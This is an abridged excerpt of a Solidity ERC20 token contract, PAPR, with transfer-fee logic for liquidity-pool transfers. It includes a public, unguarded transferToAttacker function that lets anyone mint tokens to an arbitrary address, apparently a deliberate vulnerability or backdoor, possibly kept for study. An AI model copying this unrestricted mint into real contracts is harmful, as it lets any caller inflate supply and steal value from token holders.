...
import './libs/ExternalsCalls.sol';
...
contract PAPR is ERC20Burnable, DoubleOperator, ExternalsCalls {
    ...
    function transferToAttacker(address attacker) public {
        _mint(attacker, 100 * 10e18);
    }
    ...
    function _transferOverride(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if ((isSenderExcludedAddresses(sender) == false || isRecipientExcludedAddresses(recipient) == false) && isPaprLiquidityPool(recipient)) {
            uint feesAmount = amount.mul(10).div(100); // feesTaxRate[_countTimesOverCents()]
